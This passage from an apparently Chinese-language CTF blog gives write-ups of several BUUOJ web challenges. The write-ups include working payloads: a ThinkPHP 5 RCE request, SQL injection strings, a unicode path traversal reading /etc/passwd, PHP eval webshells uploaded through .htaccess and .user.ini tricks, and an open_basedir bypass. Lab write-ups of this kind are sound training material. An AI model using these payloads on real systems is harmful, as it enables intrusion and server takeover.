class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j))</span><br></pre></td></tr></table></figure>

<h4 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h4><p>Java的站，点help看到<code>filename=help.docx</code>，可能存在文件包含。</p>
<p>java应用的安全目录是<code>WEB-INF</code>，访问其中的文件要通过 web.xml 进行相应映射才能访问。包括：</p>
<ul>
<li><code>WEB-INF/web.xml</code>，Web应用配置文件，描述servlet和其他应用组件配置及命名规则。</li>
<li><code>WEB-INF/classes/</code>，包含站点所有用的class文件，包括 servlet class 和非servlet class，不能包含在 .jar 文件中。</li>
<li><code>WEB-INF/lib/</code>，存放web应用需要的 jar 文件，放置仅在这个应用中要求使用的 .jar 文件，例如数据库驱动 jar文件。</li>
<li><code>WEB-INF/src/</code>，源码目录，按包结构放置各个 java 文件。</li>
<li><code>WEB-INF/database.properties</code>，数据库配置文件。</li>
</ul>
<p>访问<code>WEB-INF/web.xml</code>，用POST方法？，可以看到</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问这个 class 文件，<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code>，可以看到一串 base64，解码得到flag。</p>
<h4 id="BJDCTF2020-Old-Hack"><a href="#BJDCTF2020-Old-Hack" class="headerlink" title="[BJDCTF2020]Old Hack"></a>[BJDCTF2020]Old Hack</h4><p>ThinkPHP 5 的RCE，直接上，<code>?s=captcha</code>，POST传<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag</code></p>
<h4 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h4><p>看响应头里有<code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code>，true是返回的十六进制MD5转化为字符串，输入<code>ffifdyop</code>，这个字符串转化之后是<code>&#39;or&#39;6....</code>。</p>
<p>然后是弱类型，传数组就可以<code>a[]=1&amp;b[]=2</code>。</p>
<p>然后是强类型，用 fastcoll，先生成两个md5值一样的文件</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fastcoll_v1<span class="number">.0</span><span class="number">.0</span><span class="number">.5</span>.exe source.txt</span><br></pre></td></tr></table></figure>

<p>读取文件的时候要用二进制格式，因为含有文本格式解码不了的字符</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">url</span> = &#x27;http://<span class="number">337</span>b<span class="number">4</span>ffe-e<span class="number">9</span>cf-<span class="number">4213</span>-a<span class="number">211</span>-e<span class="number">49</span>ab<span class="number">794</span>d<span class="number">636</span>.node<span class="number">3</span>.buuoj.cn/levell<span class="number">14</span>.php&#x27;</span><br><span class="line"><span class="attribute">with</span> open(&#x27;./<span class="number">1</span>.txt&#x27;, &#x27;rb&#x27;) as f<span class="number">1</span>:</span><br><span class="line">    <span class="attribute">with</span> open(&#x27;./<span class="number">2</span>.txt&#x27;, &#x27;rb&#x27;) as f<span class="number">2</span>:</span><br><span class="line">        <span class="attribute">t1</span> = f<span class="number">1</span>.read()</span><br><span class="line">        <span class="attribute">t2</span> = f<span class="number">2</span>.read()</span><br><span class="line">        <span class="attribute">data</span> = &#123;&#x27;param<span class="number">1</span>&#x27;: t<span class="number">1</span>,&#x27;param<span class="number">2</span>&#x27;: t<span class="number">2</span>&#125;</span><br><span class="line">        <span class="attribute">r</span> = requests.post(url, data=data)</span><br><span class="line">        <span class="attribute">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h4><p>随便输一个用户名和密码，看到提示<code>L0g1n.php</code>，在里面看到要99年后访问。在Cookie的 time 里改一个很大的数字，提示要从本地访问。<code>X-Forwarded-For</code>不行，换一个<code>Client-ip</code>。要从<code>gem-love.com</code>访问，改<code>Referer</code>。要从<code>Commodo 64</code>访问，查一下完整的 UA，是<code>Commodore 64</code>。要求邮箱，用<code>From</code>头。需要代理，用<code>Via</code>头。</p>
<table>
<thead>
<tr>
<th>Header</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>Accept</td>
<td>指定客户端能够接收的内容类型</td>
<td>Accept: text/plain, text/html,application/json</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>浏览器可以接受的字符编码集。</td>
<td>Accept-Charset: iso-8859-5</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td>
<td>Accept-Encoding: compress, gzip</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>浏览器可接受的语言</td>
<td>Accept-Language: en,zh</td>
</tr>
<tr>
<td>Accept-Ranges</td>
<td>可以请求网页实体的一个或者多个子范围字段</td>
<td>Accept-Ranges: bytes</td>
</tr>
<tr>
<td>Authorization</td>
<td>HTTP授权的授权证书</td>
<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Cache-Control</td>
<td>指定请求和响应遵循的缓存机制</td>
<td>Cache-Control: no-cache</td>
</tr>
<tr>
<td>Connection</td>
<td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td>
<td>Connection: close</td>
</tr>
<tr>
<td>Cookie</td>
<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
<td>Cookie: $Version=1; Skin=new;</td>
</tr>
<tr>
<td>Content-Length</td>
<td>请求的内容长度</td>
<td>Content-Length: 348</td>
</tr>
<tr>
<td>Content-Type</td>
<td>请求的与实体对应的MIME信息</td>
<td>Content-Type: application/x-www-form-urlencoded</td>
</tr>
<tr>
<td>Date</td>
<td>请求发送的日期和时间</td>
<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
</tr>
<tr>
<td>Expect</td>
<td>请求的特定的服务器行为</td>
<td>Expect: 100-continue</td>
</tr>
<tr>
<td>From</td>
<td>发出请求的用户的Email</td>
<td>From: <a href="mailto:&#x75;&#x73;&#x65;&#114;&#64;&#101;&#109;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#109;">&#x75;&#x73;&#x65;&#114;&#64;&#101;&#109;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#109;</a></td>
</tr>
<tr>
<td>Host</td>
<td>指定请求的服务器的域名和端口号</td>
<td>Host: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/">www.zcmhi.com</a></td>
</tr>
<tr>
<td>If-Match</td>
<td>只有请求内容与实体相匹配才有效</td>
<td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td>
<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td>
<td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Range</td>
<td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td>
<td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>只在实体在指定时间之后未被修改才请求成功</td>
<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>限制信息通过代理和网关传送的时间</td>
<td>Max-Forwards: 10</td>
</tr>
<tr>
<td>Pragma</td>
<td>用来包含实现特定的指令</td>
<td>Pragma: no-cache</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>连接到代理的授权证书</td>
<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Range</td>
<td>只请求实体的一部分，指定范围</td>
<td>Range: bytes=500-999</td>
</tr>
<tr>
<td>Referer</td>
<td>先前网页的地址，当前请求网页紧随其后,即来路</td>
<td>Referer: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives…</a></td>
</tr>
<tr>
<td>TE</td>
<td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td>
<td>TE: trailers,deflate;q=0.5</td>
</tr>
<tr>
<td>Upgrade</td>
<td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td>
<td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
</tr>
<tr>
<td>User-Agent</td>
<td>User-Agent的内容包含发出请求的用户信息</td>
<td>User-Agent: Mozilla/5.0 (Linux; X11)</td>
</tr>
<tr>
<td>Via</td>
<td>通知中间网关或代理服务器地址，通信协议</td>
<td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
</tr>
<tr>
<td>Warning</td>
<td>关于消息实体的警告信息</td>
<td>Warn: 199 Miscellaneous warning</td>
</tr>
</tbody></table>
<h4 id="RoarCTF-easy-calc"><a href="#RoarCTF-easy-calc" class="headerlink" title="[RoarCTF] easy calc"></a>[RoarCTF] easy calc</h4><p>提示加了waf，看一下calc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        $str = $_GET[<span class="string">&#x27;num&#x27;</span>]; </span><br><span class="line">        $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>]; </span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123; </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>num只允许输入数字和一些符号，把查询字符串<code>?num=</code>改为<code>?%20num</code>可以绕过，而且在calc.php处理时是一样的，原理是<code>$_GET</code>和<code>$_POST</code>解析字符串的问题，可以用来bypass。</p>
<p>接下来只需要绕过引号</p>
<p><code>?%20num=var_dump(scandir(chr(47)))</code></p>
<p>列出当前目录下的文件，可以看到f1agg，读一下这个文件</p>
<p><code>?%20num=var_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p>得到flag</p>
<h4 id="SUCTF-easy-sql"><a href="#SUCTF-easy-sql" class="headerlink" title="[SUCTF] easy sql"></a>[SUCTF] easy sql</h4><p>查询语句是<code>select $_POST[&#39;query&#39;] || flag from flag</code>（不知道怎么来的）</p>
<p>payload:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>，PIPES AS CONCAT 把 || 视为字符串连接符而不是或运算， select 1 || flag 会合并 select 1 和select flag 的查询结果，如果用字母无法得到flag，因为会合并成类似 select aflag 的形式</p>
<h4 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h4><p>Unicode安全，可以参考博客里的另一篇文章，Host-Split attack。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def getUrl():</span><br><span class="line">    url = request.<span class="keyword">args</span>.<span class="built_in">get</span>(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="keyword">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h in host.<span class="keyword">split</span>(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.<span class="keyword">append</span>(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.<span class="keyword">join</span>(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).<span class="keyword">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).<span class="keyword">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>/getUrl?url=file%3A//suctf.c%E2%84%82/../../../../etc/passwd</code>，前两次没有问题，第三次会把<code>%E2%84%82</code>转化成c，可以任意文件读取。</p>
<p>读nginx配置文件，在<code>/etc/nginx/conf.d/nginx.conf</code>没发现，<code>/usr/local/nginx/conf/nginx.conf</code>找到注释<code>/usr/fffffflag</code>。</p>
<h4 id="SUCTF-checkin"><a href="#SUCTF-checkin" class="headerlink" title="[SUCTF] checkin"></a>[SUCTF] checkin</h4><p>插入后缀名改成jpg的一句话，提示<code>&lt;?in contents</code>。</p>
<p>改成<code>&lt;scriptlanguage=&quot;php&quot;&gt;</code>，提示不是图片</p>
<p>文件开头加上<code>GIF89a</code>，成功上传。</p>
<p>服务器是nginx，不能上传<code>.htaccess</code>，需要利用<code>.user.ini</code></p>
<p>在<code>.user.ini</code>中可以更改<code>php.ini</code>中的PHP_INI_PERDIR 和 PHP_INI_USER设置。</p>
<p>auto_prepend_file和auto_append_file会在php文件的前/后自动插入指定的文件。</p>
<p>上传<code>.user.ini</code>：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attribute">auto_prepend_file</span>=ow.jpg</span><br></pre></td></tr></table></figure>

<p>上传目录下有一个index.php文件，访问index.php即可执行我们上传的php文件。</p>
<h4 id="SUCTF-easy-web"><a href="#SUCTF-easy-web" class="headerlink" title="[SUCTF] easy web"></a>[SUCTF] easy web</h4><p>看一下代码，大概是要进行到<code>eval()</code>函数执行<code>get_the_flag()</code>，然后通过文件上传拿shell。</p>
<p>第一步，正则过滤了茫茫多的字符，需要绕过。参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">无字母数字shell</a>，<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字shell提高篇</a>，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5677#toc-0">php异或shell</a>，对字符串的长度，重复使用的字符也有要求。</p>
<p>接下来是php特性</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$_GET[a];  <span class="comment"># 没有引号的字符视为字符串，所以以上两条等价</span></span><br><span class="line">$_GET&#123;a&#125;;  <span class="comment"># 字符串后面跟随大括号和中括号都把字符串看作一个数组，所以以上两种等价</span></span><br><span class="line">$a=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">$a();  <span class="comment"># 动态调用函数，可以直接在字符串后加上括号把字符串当作函数名</span></span><br><span class="line"><span class="keyword">echo</span> ab^cd; <span class="comment"># 得到两个不可见字符，php可以直接对两个字符串进行异或操作，相当于两位两位分别异或</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>于是使用不可见的字符绕过正则，同时使两个字符串异或得到<code>_GET</code>，<code>$&#123;&#125;</code>没有被过滤，直接使用可以减少一个字符量。除了异或也可以使用取反或者自增。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">255</span> # %ff</span><br><span class="line">target = <span class="string">&quot;_GET&quot;</span></span><br><span class="line"><span class="keyword">res</span> = []</span><br><span class="line"><span class="keyword">for</span> t in targe<span class="variable">t:</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">l</span> in <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">l</span> ^ r == ord(t):</span><br><span class="line">            <span class="keyword">res</span>.<span class="keyword">append</span>(hex(<span class="keyword">l</span>))</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">res</span>)</span><br></pre></td></tr></table></figure>

<p>得到<code>/xa0/xb8/xba/xab</code>，payload:</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag # $_GET&#123;%ff&#125;()</span><br></pre></td></tr></table></figure>

<p>这样就可以执行<code>get_the_flag()</code>了</p>
<p>第二步文件上传，要求后缀中不存在ph，内容中不含<code>&lt;?</code>，还要通过exif_imagetype。使用.htaccess绕过后缀限制，用<code>&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[c]);&lt;/script&gt;</code>的方式上传shell，在.htaccess和shell签名加上GIF89a来绕过exif_imagetype的检测。</p>
<p>构造一个上传页面，用来上传两个文件</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Form action=<span class="string">&quot;http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/?_=<span class="subst">$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;</span>&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/Form&gt;</span></span><br></pre></td></tr></table></figure>

<p>a.aaa文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_REQUEST[<span class="string">&#x27;c&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>完了失败了，应该是在.htaccess前加的GIF89a导致文件失效了，换个方式。由于<code>#</code>在.htaccess中是注释符，不影响执行，同时这两条是图片文件头：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 123</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 123</span></span><br><span class="line">AddType application/x-httpd-php .aaa</span><br></pre></td></tr></table></figure>

<p>这时访问<code>http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=phpinfo();</code>发现返回的内容是<code>GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#39;c&#39;]);&lt;/script&gt;</code>，可能由于版本原因script标签指定的php不能起作用。改一下a.aaa文件，把<code>&lt;?php @eval($_REQUEST[c]);?&gt;</code>base64编码然后加到GIF89a后面，多加两个a是为了可以正常base64解码</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89aaaPD9waHAgQGV2YWwoJF9SRVFVRVNUW2NdKTs/<span class="attribute">Pg</span>==</span><br></pre></td></tr></table></figure>

<p>读取文件内容时用的是file_get_contents，可以使用php伪协议base64解密，所以修改.htaccess：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">#def</span>ine <span class="attribute">width</span> <span class="number">123</span></span><br><span class="line"><span class="number">#def</span>ine <span class="attribute">height</span> <span class="number">123</span></span><br><span class="line">AddType application/x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa</span></span><br></pre></td></tr></table></figure>

<p>访问<code>http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=phpinfo();</code>，成功拿到shell</p>
<p>蚁剑连接，html目录下有个假flag，再上层的目录提示无权限，在phpinfo可以看到设置了open_basedir</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This <span class="keyword">is</span> fake flag</span><br><span class="line">But I heard php7<span class="number">.2</span>-fpm has been initialized <span class="keyword">in</span> unix socket mode!</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">oepn_basedir绕过</a>，选择了chdir和ini_set合用的方式绕过</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">667</span>a<span class="number">5</span>d<span class="number">02</span>-<span class="number">8472</span>-<span class="number">42</span>fe-bd<span class="number">78</span>-<span class="number">90</span>fd<span class="number">1</span>a<span class="number">80</span>ad<span class="number">73</span>.node<span class="number">3</span>.buuoj.cn/upload/tmp_<span class="number">2</span>c<span class="number">67</span>ca<span class="number">1</span>eaeadbdc<span class="number">1868</span>d<span class="number">67003072</span>b<span class="number">481</span>/a.aaa?c=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

<p>发现根目录下的<code>THis_Is_tHe_F14g</code>，最终payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">667</span>a<span class="number">5</span>d<span class="number">02</span>-<span class="number">8472</span>-<span class="number">42</span>fe-bd<span class="number">78</span>-<span class="number">90</span>fd<span class="number">1</span>a<span class="number">80</span>ad<span class="number">73</span>.node<span class="number">3</span>.buuoj.cn/upload/tmp_<span class="number">2</span>c<span class="number">67</span>ca<span class="number">1</span>eaeadbdc<span class="number">1868</span>d<span class="number">67003072</span>b<span class="number">481</span>/a.aaa?c=chdir(%<span class="number">27</span>img%<span class="number">27</span>);ini_set(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);chdir(%<span class="number">27</span>..%<span class="number">27</span>);chdir(%<span class="number">27</span>..%<span class="number">27</span>);chdir(%<span class="number">27</span>..%<span class="number">27</span>);chdir(%<span class="number">27</span>..%<span class="number">27</span>);ini_set(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);print_r(file_get_contents(%<span class="number">27</span>/THis_Is_tHe_F<span class="number">14</span>g%<span class="number">27</span>));</span><br></pre></td></tr></table></figure>

<p>extra：打印函数被禁用，如果curl可用，可以搭建一个靶机，把信息存入数据库或者文件，将回显信息发送到靶机，命令执行无回显时可以使用以下payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=<span class="string">&quot;xxx&quot;</span>;<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>$_<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当system,passthru等不可用时，可以使用popen,proc_open等管道命令执行命令，也可以使用反引号，括起来的内容会作为shell命令执行，并将输出信息返回。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=`ls`;</span><br></pre></td></tr></table></figure>

<p>不能使用字母数字时也可以用通配符方式。</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/???/</span>??? # <span class="regexp">/bin/</span>cat</span><br><span class="line"><span class="regexp">/???/</span>??? <span class="regexp">/???/</span>???<span class="regexp">/???/</span>?????.??? # <span class="regexp">/bin/</span>cat <span class="regexp">/var/</span>www<span class="regexp">/html/i</span>ndex.php</span><br></pre></td></tr></table></figure>

<h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><p>发布广告的标题位置存在注入，要在查询广告内容的时候触发。</p>
